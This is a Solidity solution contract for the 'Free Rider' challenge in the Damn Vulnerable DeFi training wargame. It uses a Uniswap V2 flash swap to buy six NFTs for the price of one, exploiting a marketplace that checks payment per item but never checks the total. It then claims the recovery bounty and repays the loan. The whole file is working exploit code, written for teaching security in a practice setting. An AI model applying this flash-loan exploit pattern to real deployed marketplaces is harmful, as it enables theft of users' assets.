// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

import {WETH} from "solmate/tokens/WETH.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "./FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";

contract FreeRiderSaver is IUniswapV2Callee, IERC721Receiver {
    using Address for address payable;

    address public factory;
    address public freeRiderNFTMarketplace;
    address public freeRiderRecoveryManager;
    address public weth;
    address public nft;
    address public owner;

    receive() external payable {}

    constructor(
        address _factory,
        address _marketplace,
        address _recoveryManager,
        address _weth,
        address _nft,
        address _owner
    ) {
        factory = _factory;
        freeRiderNFTMarketplace = _marketplace;
        freeRiderRecoveryManager = _recoveryManager;
        weth = _weth;
        nft = _nft;
        owner = _owner;
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override {
        // Get token0 and token1
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        // Verify only the pair contract can call the callback
        require(
            msg.sender == IUniswapV2Factory(factory).getPair(token0, token1),
            "Not a Uniswap V2 pair"
        );

        // Get amount0 and amount1 out
        uint amount0Out = amount0;
        uint amount1Out = amount1;

        // Get some ETH from the WETH contract, so we can but some NFTs
        WETH(payable(weth)).withdraw(amount0Out);

        // Construct the tokenIds array parameter
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        // Buy all 6 NFTs for the price of 1, because of the bug in the marketplace
        // Verification for every buy just checks in a loop that msg.value is not < priceToPay
        // but never calculates the total amount send through `buyMany`
        FreeRiderNFTMarketplace(payable(freeRiderNFTMarketplace)).buyMany{
            value: amount0Out
        }(tokenIds);

        // Now when we have the tokens, we transfer them to the recovery manager
        // and receive the ETH bounty in the contract
        for (uint256 i = 0; i < 6; i++) {
            DamnValuableNFT(nft).safeTransferFrom(
                address(this),
                freeRiderRecoveryManager,
                i,
                abi.encode(address(this))
            );
        }

        // Repay the flashswap with fee by getting some WETH and sending it to the pair
        if (amount0Out > 0 && amount1Out == 0) {
            uint amountToRepay = (amount0Out * 1000) / 997 + 1;
            WETH(payable(weth)).deposit{value: amountToRepay}();
            ERC20(token0).transfer(msg.sender, amountToRepay);
        }

        // Send the contract ETH balance to the player
        payable(owner).sendValue(address(this).balance);
    }

    // save method to trigger the flashswap
    function save(
        address pair,
        uint amount0Out,
        uint amount1Out,
        bytes calldata callbackData
    ) external {
        IUniswapV2Pair(pair).swap(
            amount0Out,
            amount1Out,
            address(this),
            callbackData
        );
    }

    // callback required by the FreeRiderRecoveryManager
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory _data
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
